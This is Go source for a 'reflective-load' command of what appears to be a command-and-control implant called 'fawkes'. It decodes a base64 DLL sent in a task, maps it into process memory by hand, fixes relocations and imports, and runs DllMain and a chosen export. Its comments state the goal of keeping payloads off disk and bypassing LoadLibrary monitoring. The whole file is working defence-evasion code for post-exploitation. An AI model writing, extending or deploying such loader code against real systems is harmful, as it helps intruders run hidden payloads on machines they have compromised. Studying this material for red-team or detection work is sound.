//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// ReflectiveLoadCommand loads a native PE (DLL/EXE) from memory into the current process.
// This avoids writing DLLs to disk and bypasses standard LoadLibrary monitoring.
// MITRE T1620 — Reflective Code Loading
type ReflectiveLoadCommand struct{}

func (c *ReflectiveLoadCommand) Name() string { return "reflective-load" }
func (c *ReflectiveLoadCommand) Description() string {
	return "Load a native PE (DLL) from memory into the current process without touching disk (T1620)"
}

type reflectiveLoadArgs struct {
	DllB64   string `json:"dll_b64"`
	Function string `json:"function"`
}

// PE constants
const (
	rlDOSSignature      = 0x5A4D     // "MZ"
	rlNTSignature       = 0x00004550 // "PE\0\0"
	rlMachineMD64       = 0x8664
	rlDLLCharacteristic = 0x2000

	rlSCNMemExecute = 0x20000000
	rlSCNMemRead    = 0x40000000
	rlSCNMemWrite   = 0x80000000

	rlRelBasedAbsolute = 0
	rlRelBasedDir64    = 10

	rlDirEntryImport    = 1
	rlDirEntryBaseReloc = 5

	rlDllProcessAttach = 1

	rlPageReadWrite   = 0x04
	rlPageReadOnly    = 0x02
	rlPageExecuteRead = 0x20
	rlPageExecuteRW   = 0x40
	rlPageNoAccess    = 0x01

	rlMemCommit  = 0x1000
	rlMemReserve = 0x2000
	rlMemRelease = 0x8000
)

// PE structures (reuses imageDOSHeader, imageFileHeader, imageSectionHeader from ntdll_unhook.go)

type rlDataDirectory struct {
	VirtualAddress uint32
	Size           uint32
}

type rlOptionalHeader64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]rlDataDirectory
}

type rlImportDescriptor struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

type rlBaseRelocation struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

// Win32 API procs (unique RL suffix to avoid conflicts)
var (
	procVirtualAllocRL   = kernel32.NewProc("VirtualAlloc")
	procVirtualFreeRL    = kernel32.NewProc("VirtualFree")
	procVirtualProtectRL = kernel32.NewProc("VirtualProtect")
	procLoadLibraryARL   = kernel32.NewProc("LoadLibraryA")
	procGetProcAddressRL = kernel32.NewProc("GetProcAddress")
	procFlushICacheRL    = kernel32.NewProc("FlushInstructionCache")
	procGetCurrentProcRL = kernel32.NewProc("GetCurrentProcess")
)

func (c *ReflectiveLoadCommand) Execute(task structs.Task) structs.CommandResult {
	var args reflectiveLoadArgs
	if task.Params == "" {
		return errorResult("Error: dll_b64 parameter required (base64-encoded PE/DLL)")
	}
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}
	if args.DllB64 == "" {
		return errorResult("Error: dll_b64 is empty")
	}

	dllBytes, err := base64.StdEncoding.DecodeString(args.DllB64)
	if err != nil {
		return errorf("Error decoding DLL: %v", err)
	}

	if len(dllBytes) < 64 {
		return errorResult("Error: PE data too small")
	}

	return reflectiveLoad(dllBytes, args.Function)
}

func reflectiveLoad(peData []byte, exportFunc string) structs.CommandResult {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var sb strings.Builder
	sb.WriteString("[*] Reflective PE Loader\n")

	// 1. Parse DOS header (reuses imageDOSHeader from ntdll_unhook.go)
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
	if dosHeader.EMagic != rlDOSSignature {
		return errorResult("Error: invalid PE — missing MZ signature")
	}

	ntOffset := dosHeader.ELfanew
	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
		return errorResult("Error: invalid PE — bad NT header offset")
	}

	// 2. Parse NT headers (reuses imageFileHeader from ntdll_unhook.go)
	ntSig := binary.LittleEndian.Uint32(peData[ntOffset:])
	if ntSig != rlNTSignature {
		return errorResult("Error: invalid PE — missing PE signature")
	}

	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
	if fileHeader.Machine != rlMachineMD64 {
		return errorf("Error: only x64 PE supported (machine: 0x%X)", fileHeader.Machine)
	}

	optHeaderOffset := ntOffset + 4 + int32(unsafe.Sizeof(imageFileHeader{}))
	optHeader := (*rlOptionalHeader64)(unsafe.Pointer(&peData[optHeaderOffset]))

	isDLL := (fileHeader.Characteristics & rlDLLCharacteristic) != 0
	sb.WriteString(fmt.Sprintf("[+] PE type: %s, sections: %d, entry RVA: 0x%X\n",
		map[bool]string{true: "DLL", false: "EXE"}[isDLL],
		fileHeader.NumberOfSections, optHeader.AddressOfEntryPoint))
	sb.WriteString(fmt.Sprintf("[+] Image size: %d bytes, preferred base: 0x%X\n",
		optHeader.SizeOfImage, optHeader.ImageBase))

	// 3. Allocate memory for the PE image (RW initially)
	allocBase, _, err := procVirtualAllocRL.Call(
		0,
		uintptr(optHeader.SizeOfImage),
		rlMemCommit|rlMemReserve,
		rlPageReadWrite,
	)
	if allocBase == 0 {
		return errorf("Error: memory allocation failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated at 0x%X (size: %d)\n", allocBase, optHeader.SizeOfImage))

	// Ensure cleanup on failure
	loadSuccess := false
	defer func() {
		if !loadSuccess {
			procVirtualFreeRL.Call(allocBase, 0, rlMemRelease)
		}
	}()

	// 4. Copy headers (reuses copyMemory from beacon_api.go)
	copyMemory(allocBase, uintptr(unsafe.Pointer(&peData[0])), optHeader.SizeOfHeaders)

	// 5. Copy sections (reuses imageSectionHeader from ntdll_unhook.go)
	sectionOffset := optHeaderOffset + int32(fileHeader.SizeOfOptionalHeader)
	sections := make([]imageSectionHeader, fileHeader.NumberOfSections)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		off := sectionOffset + int32(i)*int32(unsafe.Sizeof(imageSectionHeader{}))
		sections[i] = *(*imageSectionHeader)(unsafe.Pointer(&peData[off]))
		sec := &sections[i]

		if sec.SizeOfRawData > 0 {
			if sec.PointerToRawData+sec.SizeOfRawData > uint32(len(peData)) {
				return errorf("Error: section %s extends beyond file", rlSectionName(sec.Name))
			}
			dest := allocBase + uintptr(sec.VirtualAddress)
			src := uintptr(unsafe.Pointer(&peData[sec.PointerToRawData]))
			copyMemory(dest, src, sec.SizeOfRawData)
		}

		// Zero remaining virtual memory if VirtualSize > SizeOfRawData
		if sec.VirtualSize > sec.SizeOfRawData {
			zeroStart := allocBase + uintptr(sec.VirtualAddress) + uintptr(sec.SizeOfRawData)
			zeroSize := sec.VirtualSize - sec.SizeOfRawData
			rlZeroMemory(zeroStart, uintptr(zeroSize))
		}
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped %d sections\n", fileHeader.NumberOfSections))

	// 6. Process base relocations
	delta := int64(allocBase) - int64(optHeader.ImageBase)
	if delta != 0 {
		relocDir := optHeader.DataDirectory[rlDirEntryBaseReloc]
		if relocDir.VirtualAddress > 0 && relocDir.Size > 0 {
			nRelocs, relocErr := rlProcessRelocations(allocBase, uintptr(relocDir.VirtualAddress), uintptr(relocDir.Size), delta)
			if relocErr != nil {
				return errorResult(sb.String() + fmt.Sprintf("Error processing relocations: %v", relocErr))
			}
			sb.WriteString(fmt.Sprintf("[+] Processed %d relocations (delta: 0x%X)\n", nRelocs, uint64(delta)))
		}
	} else {
		sb.WriteString("[+] Loaded at preferred base — no relocations needed\n")
	}

	// 7. Resolve imports
	importDir := optHeader.DataDirectory[rlDirEntryImport]
	if importDir.VirtualAddress > 0 && importDir.Size > 0 {
		nImports, importErr := rlResolveImports(allocBase, uintptr(importDir.VirtualAddress))
		if importErr != nil {
			return errorResult(sb.String() + fmt.Sprintf("Error resolving imports: %v", importErr))
		}
		sb.WriteString(fmt.Sprintf("[+] Resolved imports from %d DLLs\n", nImports))
	}

	// 8. Set section protections (W^X)
	for i := uint16(0); i < fileHeader.NumberOfSections; i++ {
		sec := &sections[i]
		prot := rlSectionProtection(sec.Characteristics)
		if prot == 0 {
			continue
		}
		var oldProt uint32
		procVirtualProtectRL.Call(
			allocBase+uintptr(sec.VirtualAddress),
			uintptr(sec.VirtualSize),
			uintptr(prot),
			uintptr(unsafe.Pointer(&oldProt)),
		)
	}
	sb.WriteString("[+] Set section protections\n")

	// 9. Flush instruction cache
	hProcess, _, _ := procGetCurrentProcRL.Call()
	procFlushICacheRL.Call(hProcess, allocBase, uintptr(optHeader.SizeOfImage))

	// 10. Call entry point (DllMain for DLLs)
	if isDLL && optHeader.AddressOfEntryPoint != 0 {
		entryPoint := allocBase + uintptr(optHeader.AddressOfEntryPoint)
		sb.WriteString(fmt.Sprintf("[*] Calling DllMain at 0x%X...\n", entryPoint))

		// DllMain(hModule, DLL_PROCESS_ATTACH, lpReserved)
		ret, _, _ := syscall.SyscallN(entryPoint, allocBase, rlDllProcessAttach, 0)
		if ret == 0 {
			sb.WriteString("[!] DllMain returned FALSE\n")
		} else {
			sb.WriteString("[+] DllMain returned TRUE\n")
		}
	}

	loadSuccess = true

	// 11. Call exported function if requested
	if exportFunc != "" {
		result, exportErr := rlCallExport(allocBase, peData, int(ntOffset), exportFunc)
		if exportErr != nil {
			sb.WriteString(fmt.Sprintf("[!] Export call failed: %v\n", exportErr))
		} else {
			sb.WriteString(fmt.Sprintf("[+] Called export '%s', returned: %d\n", exportFunc, result))
		}
	}

	sb.WriteString("[+] Reflective load complete\n")

	return successResult(sb.String())
}

